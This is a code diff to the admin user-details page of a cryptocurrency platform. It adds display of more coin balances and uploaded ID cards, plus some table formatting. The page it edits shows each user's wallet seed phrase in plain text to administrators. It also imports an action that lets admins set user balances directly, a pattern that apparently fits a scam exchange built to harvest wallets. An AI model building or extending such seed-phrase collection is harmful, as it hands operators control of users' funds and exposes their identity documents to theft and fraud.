@@ -7,16 +7,26 @@ import {
   updateUserBalance,
   deleteUser,
 } from "@/lib/actions/admin";
+import IDCardImage from "../IDCardImage";
 
 type User = {
   id: string;
   fullName: string;
   email: string;
+  IDCard: string;
   role: "ADMIN" | "USER";
   usdtBalance: string;
   btcBalance: string;
   ethBalance: string;
   bnbBalance: string;
+  dotBalance: string;
+  solBalance: string;
+  dogeBalance: string;
+  trxBalance: string;
+  xrpBalance: string;
+  usdcBalance: string;
+  ltcBalance: string;
+  maticBalance: string;
   seedPhrase?: string | null;
 };
 
@@ -41,6 +51,14 @@ export default function AdminUserDetails({
     btc: user.btcBalance,
     eth: user.ethBalance,
     bnb: user.bnbBalance,
+    dot: user.dotBalance,
+    sol: user.solBalance,
+    doge: user.dogeBalance,
+    trx: user.trxBalance,
+    xrp: user.xrpBalance,
+    usdc: user.usdcBalance,
+    ltc: user.ltcBalance,
+    matic: user.maticBalance,
   });
 
   const handleRoleChange = (newRole: "ADMIN" | "USER") => {
@@ -75,7 +93,6 @@ export default function AdminUserDetails({
       }
     });
   };
-
   return (
     <div className="p-6 text-black">
       <div className="flex items-center justify-between">
@@ -85,6 +102,13 @@ export default function AdminUserDetails({
           <p className="font-semibold">Current Role: {user.role}</p>
         </div>
       </div>
+      {user.IDCard && (
+        <div className="mt-4">
+          <p className="font-semibold mb-2">Uploaded ID Card:</p>
+          <IDCardImage path={user.IDCard} />
+        </div>
+      )}
+
       {user.seedPhrase ? (
         <div className="my-6">
           <h3 className="text-lg font-semibold mb-2">Seed Phrase</h3>
@@ -92,7 +116,7 @@ export default function AdminUserDetails({
             {user.seedPhrase}
           </div>
         </div>
-      ):(
+      ) : (
         <div className="my-6">
           <h3 className="text-lg font-semibold mb-2">Seed Phrase</h3>
           <div className="bg-gray-100 text-black p-4 rounded font-mono">
@@ -103,7 +127,20 @@ export default function AdminUserDetails({
 
       <h3 className="text-lg font-semibold mt-6 mb-2">Balances</h3>
       <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
-        {["usdt", "btc", "eth", "bnb"].map((coin) => (
+        {[
+          "usdt",
+          "btc",
+          "eth",
+          "bnb",
+          "dot",
+          "sol",
+          "doge",
+          "trx",
+          "xrp",
+          "usdc",
+          "ltc",
+          "matic",
+        ].map((coin) => (
           <div
             key={coin}
             className="bg-[#1b1f2a] p-5 rounded-xl text-white shadow flex flex-col justify-between transition-transform duration-300 hover:scale-[1.02] min-w-[280px] sm:min-w-xs md:min-w-[280px] lg:min-w-lg"
@@ -158,7 +195,7 @@ export default function AdminUserDetails({
               <tr>
                 <th className="text-left p-2">Token</th>
                 <th className="text-left p-2">Amount</th>
-      <th className="text-left p-2">Wallet</th> 
+                <th className="text-left p-2">Wallet</th>
                 <th className="text-left p-2">Status</th>
                 <th className="text-left p-2">Date</th>
               </tr>
@@ -168,7 +205,9 @@ export default function AdminUserDetails({
                 <tr key={i} className="border-b border-gray-600">
                   <td className="p-2 text-black">{tx.token}</td>
                   <td className="p-2 text-black">{tx.amount}</td>
-        <td className="p-2 text-black break-all">{tx.withdrawalWallet}</td>
+                  <td className="p-2 text-black break-all">
+                    {tx.withdrawalWallet}
+                  </td>
                   <td className="p-2 text-black">{tx.status}</td>
                   <td className="p-2 text-black">
                     {new Date(tx.createdAt).toLocaleString()}
